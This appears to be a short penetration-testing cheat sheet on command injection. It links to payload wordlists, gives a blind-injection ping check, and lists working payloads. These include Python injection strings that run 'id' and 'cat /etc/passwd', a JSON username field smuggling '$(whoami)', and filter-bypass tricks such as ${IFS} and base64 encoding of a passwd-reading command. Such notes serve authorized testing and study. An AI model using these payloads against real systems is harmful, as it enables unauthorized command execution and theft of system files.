# Command Injection

### Wordlists

{% embed url="https://github.com/payloadbox/command-injection-payload-list" %}

ICMP ping check

```bash
# Run tcpdump
sudo tcpdump -i tun0 -A icmp

# Ping from target
;ping -c 4 10.10.10.11
```

Check special chars

{% embed url="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" %}
/
{% endembed %}

Various injections

```bash
# Python command injections
') + str(__import__('os').system('id')) #
') + str(__import__('os').system('cat /etc/passwd')) #
' + __import__('os').popen('id').read() + '
'+__import__('os').system('id')+'

# API Injections using JSON
API injection using JSON
{
	"username": "mczen84$(whoami)"
}
```

Filter bypasses

```bash
%09 # Using tabs
${IFS} # Space
${PATH:0:1} # Is /

# Encode string base64
echo -n 'cat /etc/passwd | grep 33' | base64
```

Injection points to check

* Input parameters
* HTTP Headers
* Cookies
